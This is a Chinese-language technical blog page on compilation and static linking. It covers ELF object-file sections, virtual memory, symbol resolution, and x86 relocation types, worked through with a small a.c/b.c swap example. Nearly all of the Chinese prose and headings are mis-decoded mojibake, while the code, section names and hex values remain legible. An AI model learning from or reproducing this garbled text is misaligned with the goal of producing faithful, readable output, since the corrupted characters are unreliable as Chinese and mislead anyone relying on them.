<p>æºä»£ç ä¼˜åŒ–ï¼šæºä»£ç ä¼˜åŒ–å™¨(Source Code Optimizer)ï¼Œå°†æ•´ä¸ªè¯­æ³•ä¹¦è½¬åŒ–ä¸ºä¸­é—´ä»£ç ï¼ˆIntermediate Codeï¼‰ï¼ˆä¸­é—´ä»£ç æ˜¯ä¸ç›®æ ‡æœºå™¨å’Œè¿è¡Œç¯å¢ƒæ— å…³çš„ï¼‰ã€‚ä¸­é—´ä»£ç ä½¿å¾—ç¼–è¯‘å™¨è¢«åˆ†ä¸ºå‰ç«¯å’Œåç«¯ã€‚ç¼–è¯‘å™¨å‰ç«¯è´Ÿè´£äº§ç”Ÿæœºå™¨æ— å…³çš„ä¸­é—´ä»£ç ï¼›ç¼–è¯‘å™¨åç«¯å°†ä¸­é—´ä»£ç è½¬åŒ–ä¸ºç›®æ ‡æœºå™¨ä»£ç ã€‚</p>
<p>ç›®æ ‡ä»£ç ç”Ÿæˆï¼šä»£ç ç”Ÿæˆå™¨(Code Generator).</p>
<p>ç›®æ ‡ä»£ç ä¼˜åŒ–ï¼šç›®æ ‡ä»£ç ä¼˜åŒ–å™¨(Target Code Optimizer)ã€‚</p>
<p>é“¾æ¥çš„ä¸»è¦å†…å®¹æ˜¯æŠŠå„ä¸ªæ¨¡å—ä¹‹é—´ç›¸äº’å¼•ç”¨çš„éƒ¨åˆ†å¤„ç†å¥½ï¼Œä½¿å¾—å„ä¸ªæ¨¡å—ä¹‹é—´èƒ½å¤Ÿæ­£ç¡®åœ°è¡”æ¥ã€‚</p>
<p>é“¾æ¥çš„ä¸»è¦è¿‡ç¨‹åŒ…æ‹¬ï¼šåœ°å€å’Œç©ºé—´åˆ†é…ï¼ˆAddress and Storage Allocationï¼‰ï¼Œç¬¦å·å†³è®®ï¼ˆSymbol Resolutionï¼‰ï¼Œé‡å®šä½ï¼ˆRelocationï¼‰ç­‰ã€‚</p>
<p>é“¾æ¥åˆ†ä¸ºé™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥ã€‚</p>
<p>é™æ€é“¾æ¥æ˜¯æŒ‡åœ¨ç¼–è¯‘é˜¶æ®µç›´æ¥æŠŠé™æ€åº“åŠ å…¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­å»ï¼Œè¿™æ ·å¯æ‰§è¡Œæ–‡ä»¶ä¼šæ¯”è¾ƒå¤§ã€‚</p>
<p>è€ŒåŠ¨æ€é“¾æ¥åˆ™æ˜¯æŒ‡é“¾æ¥é˜¶æ®µä»…ä»…åªåŠ å…¥ä¸€äº›æè¿°ä¿¡æ¯ï¼Œè€Œç¨‹åºæ‰§è¡Œæ—¶å†ä»ç³»ç»Ÿä¸­æŠŠç›¸åº”åŠ¨æ€åº“åŠ è½½åˆ°å†…å­˜ä¸­å»ã€‚</p>
<p>é™æ€é“¾æ¥çš„å¤§è‡´è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="http://smilejay.b0.upaiyun.com/wp-content/uploads/2012/01/linking.jpg" alt=""></p>
<p>static linking</p>
<h2 id="äºŒã€ç›®æ ‡æ–‡ä»¶çš„æ ·å­ï¼ˆä»¥linuxä¸‹çš„elfæ–‡ä»¶æ ¼å¼ä¸ºä¾‹ï¼‰"><a href="#äºŒã€ç›®æ ‡æ–‡ä»¶çš„æ ·å­ï¼ˆä»¥linuxä¸‹çš„elfæ–‡ä»¶æ ¼å¼ä¸ºä¾‹ï¼‰" class="headerlink" title="äºŒã€ç›®æ ‡æ–‡ä»¶çš„æ ·å­ï¼ˆä»¥linuxä¸‹çš„elfæ–‡ä»¶æ ¼å¼ä¸ºä¾‹ï¼‰"></a>äºŒã€ç›®æ ‡æ–‡ä»¶çš„æ ·å­ï¼ˆä»¥linuxä¸‹çš„elfæ–‡ä»¶æ ¼å¼ä¸ºä¾‹ï¼‰</h2><p><img src="http://img.my.csdn.net/uploads/201302/02/1359777256_5685.jpg" alt=""></p>
<p>å¤¹åœ¨ELFå¤´å’ŒèŠ‚å¤´éƒ¨è¡¨ä¹‹é—´çš„éƒ½æ˜¯èŠ‚ã€‚ä¸€ä¸ªå…¸å‹çš„ELFå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶åŒ…å«ä¸‹é¢å‡ ä¸ªèŠ‚ï¼š</p>
<pre><code>.textï¼šå·²ç¼–è¯‘ç¨‹åºçš„æœºå™¨ä»£ç ã€‚
.rodataï¼šåªè¯»æ•°æ®ï¼Œæ¯”å¦‚printfè¯­å¥ä¸­çš„æ ¼å¼ä¸²å’Œå¼€å…³ï¼ˆswitchï¼‰è¯­å¥çš„è·³è½¬è¡¨ã€‚
.dataï¼šå·²åˆå§‹åŒ–çš„å…¨å±€Cå˜é‡ã€‚å±€éƒ¨Cå˜é‡åœ¨è¿è¡Œæ—¶è¢«ä¿å­˜åœ¨æ ˆä¸­ï¼Œæ—¢ä¸å‡ºç°åœ¨.dataä¸­ï¼Œä¹Ÿä¸å‡ºç°åœ¨.bssèŠ‚ä¸­ã€‚
.bssï¼šæœªåˆå§‹åŒ–çš„å…¨å±€Cå˜é‡ã€‚åœ¨ç›®æ ‡æ–‡ä»¶ä¸­è¿™ä¸ªèŠ‚ä¸å æ®å®é™…çš„ç©ºé—´ï¼Œå®ƒä»…ä»…æ˜¯ä¸€ä¸ªå ä½ç¬¦ã€‚ç›®æ ‡æ–‡ä»¶æ ¼å¼åŒºåˆ†åˆå§‹åŒ–å’Œæœªåˆå§‹åŒ–å˜é‡æ˜¯ä¸ºäº†ç©ºé—´æ•ˆç‡åœ¨ï¼šåœ¨ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œæœªåˆå§‹åŒ–å˜é‡ä¸éœ€è¦å æ®ä»»ä½•å®é™…çš„ç£ç›˜ç©ºé—´ã€‚
.symtabï¼šä¸€ä¸ªç¬¦å·è¡¨ï¼ˆsymbol tableï¼‰ï¼Œå®ƒå­˜æ”¾åœ¨ç¨‹åºä¸­è¢«å®šä¹‰å’Œå¼•ç”¨çš„å‡½æ•°å’Œå…¨å±€å˜é‡ï¼ˆåŒ…æ‹¬å¼•ç”¨åˆ°çš„å¤–éƒ¨å˜é‡å’Œå‡½æ•°ï¼Œä¸å«æœ‰å±€éƒ¨å˜é‡ï¼‰çš„ä¿¡æ¯ã€‚ä¸€äº›ç¨‹åºå‘˜é”™è¯¯åœ°è®¤ä¸ºå¿…é¡»é€šè¿‡-gé€‰é¡¹æ¥ç¼–è¯‘ä¸€ä¸ªç¨‹åºï¼Œå¾—åˆ°ç¬¦å·è¡¨ä¿¡æ¯ã€‚å®é™…ä¸Šï¼Œæ¯ä¸ªå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶åœ¨.symtabä¸­éƒ½æœ‰ä¸€å¼ ç¬¦å·è¡¨ã€‚ç„¶è€Œï¼Œå’Œç¼–è¯‘å™¨ä¸­çš„ç¬¦å·è¡¨ä¸åŒï¼Œ.symtabç¬¦å·è¡¨ä¸åŒ…å«å±€éƒ¨å˜é‡çš„è¡¨ç›®ã€‚
.rel.textï¼šå½“é“¾æ¥å™æŠŠè¿™ä¸ªç›®æ ‡æ–‡ä»¶å’Œå…¶ä»–æ–‡ä»¶ç»“åˆæ—¶ï¼Œ.textèŠ‚ä¸­çš„è®¸å¤šä½ç½®éƒ½éœ€è¦ä¿®æ”¹ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œä»»ä½•è°ƒç”¨å¤–éƒ¨å‡½æ•°æˆ–è€…å¼•ç”¨å…¨å±€å˜é‡ï¼ˆåŒ…æ‹¬æœ¬ç›®æ ‡æ–‡ä»¶å†…çš„å…¨å±€å˜é‡ï¼Œå› ä¸ºåœ¨é“¾æ¥æ—¶è¦å¤šä¸ªç›®æ ‡æ–‡ä»¶çš„ç›¸åŒæ®µåˆå¹¶ï¼Œè¿™æ ·æ•°æ®çš„åœ°å€å°±ä¼šæ”¹å˜ï¼Œæ‰€ä»¥è¦é‡å®šä½ï¼‰çš„æŒ‡ä»¤éƒ½éœ€è¦ä¿®æ”¹ã€‚å¦ä¸€æ–¹é¢è°ƒç”¨æœ¬åœ°å‡½æ•°çš„æŒ‡ä»¤åˆ™ä¸éœ€è¦ä¿®æ”¹ã€‚æ³¨æ„ï¼Œå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¸­å¹¶ä¸éœ€è¦é‡å®šä½ä¿¡æ¯ï¼Œå› æ­¤é€šå¸¸çœç•¥ï¼Œé™¤éä½¿ç”¨è€…æ˜¾å¼åœ°æŒ‡ç¤ºé“¾æ¥å™¨åŒ…å«è¿™äº›ä¿¡æ¯ã€‚
.rel.dataï¼šè¢«æ¨¡å—å®šä¹‰æˆ–å¼•ç”¨çš„ä»»ä½•å…¨å±€å˜é‡çš„ä¿¡æ¯ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œä»»ä½•å·²åˆå§‹åŒ–å…¨å±€å˜é‡çš„åˆå§‹å€¼æ˜¯å…¨å±€å˜é‡æˆ–è€…å¤–éƒ¨å®šä¹‰å‡½æ•°çš„åœ°å€éƒ½éœ€è¦è¢«ä¿®æ”¹ã€‚
.debugï¼šä¸€ä¸ªè°ƒè¯•ç¬¦å·è¡¨ï¼Œå…¶æœ‰äº›è¡¨ç›®æ˜¯ç¨‹åºä¸­å®šä¹‰çš„å±€éƒ¨å˜é‡å’Œç±»å‹å®šä¹‰ï¼Œæœ‰äº›è¡¨ç›®æ˜¯ç¨‹åºä¸­å®šä¹‰å’Œå¼•ç”¨çš„å…¨å±€å˜é‡ï¼Œæœ‰äº›æ˜¯åŸå§‹çš„Cæºæ–‡ä»¶ã€‚åªæœ‰ä»¥-gé€‰é¡¹è°ƒç”¨ç¼–è¯‘é©±åŠ¨ç¨‹åºæ—¶ï¼Œæ‰ä¼šå¾—åˆ°è¿™å¼ è¡¨ã€‚
.lineï¼šåŸå§‹Cæºç¨‹åºä¸­çš„è¡Œå·å’Œ.textèŠ‚ä¸­æœºå™¨æŒ‡ä»¤ä¹‹é—´çš„æ˜ å°„ã€‚åªæœ‰ä»¥-gé€‰é¡¹è°ƒç”¨ç¼–è¯‘é©±åŠ¨ç¨‹åºæ—¶ï¼Œæ‰ä¼šå¾—åˆ°è¿™å¼ è¡¨ã€‚
.strtabï¼šä¸€ä¸ªå­—ç¬¦ä¸²è¡¨ï¼Œå…¶å†…å®¹åŒ…æ‹¬.symtabå’Œ.debugèŠ‚ä¸­çš„ç¬¦å·è¡¨ï¼Œä»¥åŠèŠ‚å¤´éƒ¨ä¸­çš„èŠ‚åå­—ã€‚å­—ç¬¦ä¸²è¡¨å°±æ˜¯ä»¥nullç»“å°¾çš„å­—ç¬¦ä¸²åºåˆ—ã€‚
</code></pre><p>æ—æ³¨ï¼šä¸ºä»€ä¹ˆæœªåˆå§‹åŒ–çš„æ•°æ®ç§°ä¸º.bss?</p>
<p>ç”¨æœ¯è¯­.bssæ¥è¡¨ç¤ºæœªåˆå§‹åŒ–çš„æ•°æ®æ˜¯å¾ˆæ™®éçš„ã€‚å®ƒèµ·å§‹äºIBM 704æ±‡ç¼–è¯­è¨€ï¼ˆå¤§çº¦åœ¨1957å¹´ï¼‰ä¸­â€å—å­˜å‚¨å¼€å§‹ï¼ˆBlock Storage Startï¼‰â€œæŒ‡ä»¤çš„é¦–å­—æ¯ç¼©å†™ï¼Œå¹¶æ²¿ç”¨è‡³ä»Šã€‚ä¸€ä¸ªè®°ä½åŒºåˆ†.dataå’Œ.bssèŠ‚çš„ç®€å•æ–¹æ³•æ˜¯æŠŠâ€œbssâ€çœ‹æˆæ˜¯â€œæ›´å¥½åœ°èŠ‚çœç©ºé—´ï¼ˆBetter Save Spaceï¼‰ï¼â€œçš„ç¼©å†™ã€‚</p>
<h2 id="ä¸‰ã€é™æ€é“¾æ¥"><a href="#ä¸‰ã€é™æ€é“¾æ¥" class="headerlink" title="ä¸‰ã€é™æ€é“¾æ¥"></a>ä¸‰ã€é™æ€é“¾æ¥</h2><p>è™šæ‹Ÿå­˜å‚¨å™¨æ˜¯å»ºç«‹åœ¨ä¸»å­˜â€“è¾…å­˜ç‰©ç†ç»“æ„åŸºç¡€ä¸Šï¼Œæœ‰é™„åŠ çš„ç¡¬ä»¶è£…ç½®åŠæ“ä½œç³»ç»Ÿå­˜å‚¨ç®¡ç†è½¯ä»¶ç»„æˆçš„ä¸€ç§å­˜å‚¨ä½“ç³»ã€‚</p>
<p><img src="http://hi.csdn.net/attachment/201011/28/0_1290943844z9zN.gif" alt=""></p>
<p>é¡¾åæ€ä¹‰ï¼Œè™šæ‹Ÿå­˜å‚¨å™¨æ˜¯è™šæ‹Ÿçš„å­˜å‚¨å™¨ï¼Œå®ƒå…¶å®æ˜¯ä¸å­˜åœ¨çš„ï¼Œè€Œä»…ä»…æ˜¯ç”±ä¸€äº›ç¡¬ä»¶å’Œè½¯ä»¶ç®¡ç†çš„ä¸€ç§â€œç³»ç»Ÿâ€ã€‚ä»–æä¾›äº†ä¸‰ä¸ªé‡è¦çš„èƒ½åŠ›ï¼š<br>1ï¼Œå®ƒå°†ä¸»å­˜çœ‹æˆä¸€ä¸ªå­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„åœ°å€ç©ºé—´çš„é«˜é€Ÿç¼“å­˜ï¼Œåœ¨ä¸»å­˜ä¸­åªä¿å­˜æ´»åŠ¨åŒºåŸŸï¼Œå¹¶æ ¹æ®éœ€è¦åœ¨ç£ç›˜å’Œä¸»å­˜ä¹‹é—´æ¥å›ä¼ é€æ•°æ®ï¼ˆè¿™é‡Œå­˜åœ¨â€œäº¤æ¢ç©ºé—´â€ä»¥åŠâ€œé¡µé¢è°ƒåº¦â€ç­‰æ¦‚å¿µï¼‰ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ï¼Œé«˜æ•ˆåœ°åˆ©ç”¨ä¸»å­˜ï¼›2ï¼Œå®ƒä¸ºæ¯ä¸ªè¿›ç¨‹æä¾›äº†ç»Ÿä¸€çš„åœ°å€ç©ºé—´ï¼ˆä»¥è™šæ‹Ÿåœ°å€ç¼–å€ï¼‰ï¼Œä»è€Œç®€åŒ–äº†å­˜å‚¨å™¨ç®¡ç†ï¼›3ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºæ¯ä¸ªè¿›ç¨‹æä¾›ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œä»è€Œä¿æŠ¤äº†æ¯ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸è¢«å…¶ä»–è¿›ç¨‹ç ´åã€‚ </p>
<p>è™šæ‹Ÿå­˜å‚¨å™¨ä¸è™šæ‹Ÿåœ°å€ç©ºé—´æ˜¯ä¸¤ä¸ªä¸åŒçš„æ¦‚å¿µï¼šè™šæ‹Ÿå­˜å‚¨å™¨æ˜¯å‡æƒ³çš„å­˜å‚¨å™¨ï¼Œè€Œè™šæ‹Ÿå­˜å‚¨ç©ºé—´æ˜¯å‡æƒ³çš„å†…å­˜ã€‚å®ƒä»¬ä¹‹é—´çš„å…³ç³»åº”è¯¥ä¸ä¸»å­˜å‚¨å™¨ä¸å†…å­˜ç©ºé—´ä¹‹é—´çš„å…³ç³»ç±»ä¼¼ã€‚</p>
<p>é“¾æ¥éƒ¨åˆ†ï¼š</p>
<p>é“¾æ¥å°±æ˜¯å°†ä¸åŒéƒ¨åˆ†çš„ä»£ç å’Œæ•°æ®æ”¶é›†å’Œç»„åˆæˆä¸€ä¸ªå•ä¸€æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯æŠŠä¸åŒç›®æ ‡æ–‡ä»¶åˆå¹¶æˆæœ€ç»ˆå¯æ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹ã€‚å½“ç„¶ï¼ŒåŠ¡å¿…çŸ¥é“ï¼šè¿™ä¸ªè¿‡ç¨‹ä¸æ¶‰åŠå†…å­˜ã€‚</p>
<h4 id="é“¾æ¥å¯ä»¥åˆ†ä¸ºä¸‰ç§æƒ…å½¢ï¼š"><a href="#é“¾æ¥å¯ä»¥åˆ†ä¸ºä¸‰ç§æƒ…å½¢ï¼š" class="headerlink" title="é“¾æ¥å¯ä»¥åˆ†ä¸ºä¸‰ç§æƒ…å½¢ï¼š"></a>é“¾æ¥å¯ä»¥åˆ†ä¸ºä¸‰ç§æƒ…å½¢ï¼š</h4><pre><code>1ï¼Œç¼–è¯‘æ—¶é“¾æ¥ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„é™æ€é“¾æ¥ï¼›
2ï¼Œè£…è½½æ—¶é“¾æ¥ï¼›
3ï¼Œè¿è¡Œæ—¶é“¾æ¥ã€‚è£…è½½æ—¶é“¾æ¥å’Œè¿è¡Œæ—¶é“¾æ¥åˆç§°ä¸ºåŠ¨æ€é“¾æ¥ã€‚åœ¨æ­¤ï¼Œæˆ‘ä»¬çš„é“¾æ¥éƒ¨åˆ†å°†ä¸»è¦è®²è¿°é™æ€é“¾æ¥ï¼Œè€Œè£…è½½æ—¶é“¾æ¥æˆ‘ä»¬æ”¾åœ¨è£…è½½éƒ¨åˆ†è®²ï¼Œè¿è¡Œæ—¶é“¾æ¥å¿½ç•¥ã€‚
</code></pre><h3 id="1ã€ä»€ä¹ˆæ˜¯é™æ€é“¾æ¥ï¼Ÿ"><a href="#1ã€ä»€ä¹ˆæ˜¯é™æ€é“¾æ¥ï¼Ÿ" class="headerlink" title="1ã€ä»€ä¹ˆæ˜¯é™æ€é“¾æ¥ï¼Ÿ"></a>1ã€ä»€ä¹ˆæ˜¯é™æ€é“¾æ¥ï¼Ÿ</h3><p>é™æ€é“¾æ¥å°±æ˜¯å°†å¤šä¸ªç›®æ ‡æ–‡ä»¶ç»„åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¦‚å°†a.o å’Œ b.o é“¾æ¥åœ¨ä¸€èµ·å½¢æˆ å¯æ‰§è¡Œæ–‡ä»¶abã€‚</p>
<h3 id="2ã€é™æ€é“¾æ¥çš„è¿‡ç¨‹åŒ…æ‹¬å“ªå‡ ä¸ªéƒ¨åˆ†ï¼Ÿ"><a href="#2ã€é™æ€é“¾æ¥çš„è¿‡ç¨‹åŒ…æ‹¬å“ªå‡ ä¸ªéƒ¨åˆ†ï¼Ÿ" class="headerlink" title="2ã€é™æ€é“¾æ¥çš„è¿‡ç¨‹åŒ…æ‹¬å“ªå‡ ä¸ªéƒ¨åˆ†ï¼Ÿ"></a>2ã€é™æ€é“¾æ¥çš„è¿‡ç¨‹åŒ…æ‹¬å“ªå‡ ä¸ªéƒ¨åˆ†ï¼Ÿ</h3><pre><code>é™æ€é“¾æ¥åŒ…æ‹¬ä¸¤ä¸ªå¤§éƒ¨åˆ†ï¼šä¸€æ˜¯ç©ºé—´å’Œåœ°å€çš„åˆ†é…ï¼›äºŒæ˜¯ç¬¦å·è§£æå’Œé‡å®šä½
</code></pre><p>####ï¼ˆ1ï¼‰ç©ºé—´å’Œåœ°å€çš„åˆ†é…</p>
<p>ç¼–è¯‘å™¨åœ¨å°†a.o å’Œ b.o æ˜¯å¦‚ä½•åˆå¹¶åœ¨ä¸€èµ·çš„ï¼Ÿï¼Ÿ</p>
<p>ç¬¬äºŒç§æ–¹æ³•å°±æ˜¯ ç›¸ä¼¼æ®µåˆå¹¶ï¼šé¡¾åæ€ä¹‰ å°±æ˜¯æŠŠä¸åŒç›®æ ‡æ–‡ä»¶çš„ç›¸åŒåå­—çš„æ®µåˆå¹¶æˆä¸€ä¸ªæ®µï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<p><img src="http://images2015.cnblogs.com/blog/376860/201608/376860-20160806114729590-1085295555.png" alt=""></p>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€å›¾1</p>
<p>è¿™æ˜¯ç¼–è¯‘å™¨å®é™…è¿›è¡Œåˆå¹¶ç›®æ ‡æ–‡ä»¶çš„ç­–ç•¥ã€‚</p>
<pre><code>/*a.c*/
extern int shared;
int main()
{
int a = 100;
swap(&amp;a,&amp;shared);
}

/*b.c*/
int shared = 1;
void swap(int *a,int *b)
{
   *a ^= *b ^= *a ^= *b;
}  
</code></pre><p>ç¼–è¯‘è¿™ä¸¤ä¸ªæ–‡ä»¶å¾—åˆ°â€œa.oâ€å’Œâ€œb.oâ€ä¸¤ä¸ªç›®æ ‡æ–‡ä»¶</p>
<p>Â§gcc -c a.c b.c</p>
<p>ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªç¬¦å·ï¼šshareï¼Œswapå’Œmainã€‚</p>
<p>é™æ€é“¾æ¥çš„æ•´ä¸ªè¿‡ç¨‹åˆ†ä¸ºä¸¤æ­¥:</p>
<p>ç¬¬ä¸€æ­¥ï¼šç©ºé—´å’Œåœ°å€åˆ†é…ã€‚æ‰«ææ‰€æœ‰çš„è¾“å…¥ç›®æ ‡æ–‡ä»¶ï¼Œè·å¾—ä»–ä»¬çš„å„ä¸ªæ®µçš„é•¿åº¦ã€å±æ€§å’Œä½ç½®ï¼Œå¹¶ä¸”å°†è¾“å…¥ç›®æ ‡æ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨ä¸­æ‰€æœ‰çš„ç¬¦å·å®šä¹‰å’Œç¬¦å·å¼•ç”¨æ”¶é›†èµ·æ¥ï¼Œç»Ÿä¸€æ”¾åˆ°ä¸€ä¸ªå…¨å±€ç¬¦å·è¡¨ã€‚è¿™æ ·ï¼Œè¿æ¥å™¨å°†èƒ½å¤Ÿè·å¾—æ‰€æœ‰è¾“å…¥ç›®æ ‡æ–‡ä»¶çš„æ®µé•¿åº¦ï¼Œå¹¶ä¸”å°†å®ƒä»¬åˆå¹¶ï¼Œè®¡ç®—å‡ºè¾“å‡ºæ–‡ä»¶ä¸­å„ä¸ªæ®µåˆå¹¶åçš„é•¿åº¦ä¸ä½ç½®ï¼Œå¹¶å»ºç«‹æ˜ å°„å…³ç³»ã€‚</p>
<p>è¿™é‡Œå¯èƒ½ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼šå»ºç«‹äº†ä»€ä¹ˆæ ·çš„æ˜ å°„å…³ç³»ã€‚å¦‚ä¸Šé¢çš„å›¾1ï¼Œä½ å¯èƒ½å°±ä¼šæœ‰æ‰€äº†è§£ã€‚æ˜ å°„å…³ç³»å°±æ˜¯æŒ‡å¯æ‰§è¡Œæ–‡ä»¶ä¸è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ä¹‹é—´çš„æ˜ å°„ã€‚é‚£ä¹ˆï¼Œè¿™é‡Œç¨‹åºè¿˜æ²¡æœ‰æ‰§è¡Œï¼Œæ›´ä¸ä¼šå‡ºç°è¿›ç¨‹ï¼Œå“ªé‡Œæ¥çš„è¿›ç¨‹åœ°å€ç©ºé—´å‘¢ï¼Ÿæ­¤æ—¶è™šæ‹Ÿå­˜å‚¨å™¨ä¾¿å‘æŒ¥äº†å¾ˆå¤§çš„ä½œç”¨ï¼šè™½ç„¶æ­¤æ—¶æ²¡æœ‰è¿›ç¨‹ï¼Œä½†æ˜¯æ¯ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´çš„æ ¼å¼éƒ½æ˜¯ä¸€è‡´çš„ã€‚æ‰€ä»¥ï¼Œä¸ºå¯æ‰§è¡Œæ–‡ä»¶çš„æ¯ä¸ªæ®µç”šè‡³æ¯ä¸ªç¬¦å·ç¬¦å·åˆ†é…åœ°å€ä¹Ÿå°±ä¸ä¼šæœ‰ä»€ä¹ˆé”™äº†ã€‚æ³¨æ„ï¼šåœ¨é“¾æ¥ä¹‹å‰ï¼Œç›®æ ‡æ–‡ä»¶ä¸­çš„æ‰€æœ‰æ®µçš„è™šæ‹Ÿåœ°å€éƒ½æ˜¯0ï¼Œå› ä¸ºè™šæ‹Ÿç©ºé—´è¿˜æ²¡æœ‰è¢«åˆ†é…ï¼Œé»˜è®¤éƒ½ä¸º0.ç­‰åˆ°é“¾æ¥ä¹‹åï¼Œå¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„å„ä¸ªæ®µå·²ç»éƒ½è¢«åˆ†é…åˆ°äº†ç›¸åº”çš„è™šæ‹Ÿåœ°å€</p>
<p>ç¬¬äºŒæ­¥ï¼šç¬¦å·è§£æä¸é‡å®šä½</p>
<p>é¦–å…ˆï¼Œç¬¦å·è§£æã€‚è§£æç¬¦å·å°±æ˜¯å°†æ¯ä¸ªç¬¦å·å¼•ç”¨ä¸å®ƒè¾“å…¥çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨ä¸­çš„ä¸€ä¸ªç¡®å®šçš„ç¬¦å·å®šä¹‰è”ç³»èµ·æ¥ã€‚</p>
<p>è‹¥æ‰¾ä¸åˆ°ï¼Œåˆ™å‡ºç°ç¼–è¯‘æ—¶é”™è¯¯ã€‚   </p>
<p>å…¶æ¬¡æ˜¯é‡å®šä½ï¼›</p>
<p>ä¸åŒçš„å¤„ç†å™¨æŒ‡ä»¤å¯¹äºåœ°å€çš„æ ¼å¼å’Œæ–¹å¼éƒ½ä¸ä¸€æ ·ã€‚æˆ‘ä»¬è¿™é‡Œé‡‡ç”¨çš„æ˜¯32ä½çš„x86å¤„ç†å™¨ï¼Œä»‹ç»ä¸¤ç§å¯»å€æ–¹å¼ã€‚</p>
<h2 id="X86åŸºæœ¬é‡å®šä½ç±»å‹"><a href="#X86åŸºæœ¬é‡å®šä½ç±»å‹" class="headerlink" title="X86åŸºæœ¬é‡å®šä½ç±»å‹"></a>X86åŸºæœ¬é‡å®šä½ç±»å‹</h2><h2 id="å®å®šä¹‰-å€¼-é‡å®šä½ä¿®æ­£æ–¹æ³•"><a href="#å®å®šä¹‰-å€¼-é‡å®šä½ä¿®æ­£æ–¹æ³•" class="headerlink" title="å®å®šä¹‰                    å€¼             é‡å®šä½ä¿®æ­£æ–¹æ³•"></a>å®å®šä¹‰                    å€¼             é‡å®šä½ä¿®æ­£æ–¹æ³•</h2><h2 id="R-386-32-1-ç»å¯¹å¯»å€ä¿®æ­£S-A"><a href="#R-386-32-1-ç»å¯¹å¯»å€ä¿®æ­£S-A" class="headerlink" title="R_386_32                  1             ç»å¯¹å¯»å€ä¿®æ­£S + A"></a>R_386_32                  1             ç»å¯¹å¯»å€ä¿®æ­£S + A</h2><h2 id="R-386-PC32-2-ç›¸å¯¹å¯»å€ä¿®æ­£S-A-P"><a href="#R-386-PC32-2-ç›¸å¯¹å¯»å€ä¿®æ­£S-A-P" class="headerlink" title="R_386_PC32                2             ç›¸å¯¹å¯»å€ä¿®æ­£S + A - P"></a>R_386_PC32                2             ç›¸å¯¹å¯»å€ä¿®æ­£S + A - P</h2><p>æ³¨ï¼š</p>
<p>Aï¼šä¿å­˜åœ¨è¢«ä¿®æ­£ä½ç½®çš„å€¼ï¼Œå¯¹äº32ä½cpuçš„è¯ï¼Œé‡‡ç”¨<br>R_386_PC32å¯»å€çš„è¯<br>å®ƒåº”è¯¥ä¸º0xFFFFFFFCå³-4ï¼Œå®ƒæ˜¯ä»£è¡¨åœ°å€çš„å››ä¸ªå­—èŠ‚ï¼›è€Œé‡‡ç”¨<br>R_386_32å¯»å€ï¼Œå®ƒåº”è¯¥ä¸º0.</p>
<p>Pï¼šè¢«ä¿®æ­£çš„ä½ç½®ã€‚è€ƒè™‘ä»¥ä¸‹ç¨‹åº</p>
<p>â€¦</p>
<p>1023: 11 11 11</p>
<p>1026:e8<br>fc<br> ff ff ff</p>
<p>102b: 11 11 11</p>
<p>â€¦</p>
<p>ä¸Šè¿°è“è‰²fcæ ‡è®°å¤„å³æ˜¯è¢«ä¿®æ­£çš„ä½ç½®ï¼Œå³0x1027.</p>
<p>Sï¼šç¬¦å·çš„å®é™…åœ°å€ã€‚ä¹Ÿå°±æ˜¯ç¬¬ä¸€æ­¥ä¸­ç©ºé—´å’Œåœ°å€åˆ†é…æ—¶å¾—åˆ°çš„ç¬¦å·è™šæ‹Ÿåœ°å€ã€‚</p>
<p>ä¸¾ä¾‹æ¥è¯´å§ï¼é“¾æ¥æˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œå‡è®¾mainå‡½æ•°çš„è™šæ‹Ÿåœ°å€ä¸º0x1000ï¼Œswapå‡½æ•°çš„è™šæ‹Ÿåœ°å€ä¸º0x2000ï¼›sharedå˜é‡çš„è™šæ‹Ÿåœ°å€ä¸º0x3000;</p>
<p>ç»å¯¹åœ°å€ä¿®æ­£ï¼šå¯¹sharedå˜é‡çš„åœ°å€ä¿®æ­£ã€‚</p>
<p>l<br>Sï¼šsharedçš„å®é™…åœ°å€ä¸º0x3000ï¼›</p>
<p>l<br>Aï¼šè¢«ä¿®æ­£ä½ç½®çš„å€¼ï¼Œå³0.</p>
<p>æ‰€ä»¥æœ€åè¿™ä¸ªé‡å®šä½ä¿®æ­£åœ°å€ä¸ºï¼š0x3000ï¼Œä¸å˜ï¼</p>
<p>ç›¸å¯¹å¯»å€ä¿®æ­£ï¼šå¯¹ç¬¦å·â€œswapâ€è¿›è¡Œä¿®æ­£ã€‚</p>
<p>l<br>Sï¼šç¬¦å·swapçš„å®é™…åœ°å€ï¼Œå³0x2000ï¼›</p>
<p>l<br>Aï¼šè¢«ä¿®æ­£ä½ç½®çš„å€¼ï¼Œå³0xFFFFFFFCï¼ˆ-4ï¼‰ï¼›</p>
<p>l<br>Pï¼šè¢«ä¿®æ­£ä½ç½®ï¼ŒåŠ0x1027</p>
